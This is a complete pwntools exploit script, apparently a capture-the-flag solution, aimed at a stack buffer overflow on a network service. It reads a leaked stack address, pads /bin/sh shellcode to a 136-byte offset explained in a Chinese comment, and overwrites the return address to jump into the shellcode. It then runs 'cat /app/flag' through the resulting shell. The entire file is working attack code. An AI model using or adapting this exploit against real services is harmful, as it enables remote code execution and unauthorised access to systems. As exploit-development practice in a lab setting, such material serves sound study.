#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import os
import sys
from pwn import *

HOST = os.environ.get('HOST', '127.0.0.1')
PORT = int(os.environ.get('PORT', '9106'))

context(arch='amd64', os='linux', log_level='info')

p = remote(HOST, PORT)
p.recvuntil(b'stack: ')
buf = int(p.recvline().strip(), 16)
log.info('stack buffer @ %#x', buf)

sc = asm(shellcraft.sh())
# buf[128] 在 rbp-0x80，返回地址在 rbp+8：128 + 8 = 136
payload = sc.ljust(136, b'\x90') + p64(buf)
p.send(payload)
time.sleep(0.3)
p.sendline(b'cat /app/flag')
sys.stdout.buffer.write(p.recvall(timeout=4))
